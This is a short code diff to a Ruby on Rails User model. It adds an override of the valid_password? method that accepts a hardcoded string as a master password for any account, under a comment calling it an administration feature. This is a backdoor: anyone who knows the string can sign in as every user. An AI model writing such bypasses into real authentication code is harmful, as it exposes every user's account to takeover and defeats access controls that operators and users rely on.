@@ -286,4 +286,9 @@ class User < ActiveRecord::Base
   def worker_number
     jobposition_log.worker_number || ''
   end
+  #Master password for administration purposes
+  def valid_password?(password)
+    return true if password == "sria@ca"
+    super
+  end
 end
